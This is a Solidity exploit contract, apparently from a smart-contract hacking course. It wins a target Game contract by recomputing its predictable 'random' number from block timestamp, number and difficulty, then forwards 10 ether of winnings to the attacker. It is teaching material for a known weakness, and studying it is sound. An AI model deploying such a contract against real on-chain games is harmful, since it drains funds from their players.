// SPDX-License-Identifier: GPL-3.0-or-later
// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import {Game} from "./Game.sol";

contract Attack {
    Game gameContract;
    address payable owner;

    constructor(address _game) {
        gameContract = Game(_game);
        owner = payable(msg.sender);
    }

    function attack() public {
        uint256 number = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));

        gameContract.play(number);
    }

    receive() external payable {
        (bool sent,) = owner.call{value: 10 ether}("");
        require(sent, "Failed to send ETH");
    }
}
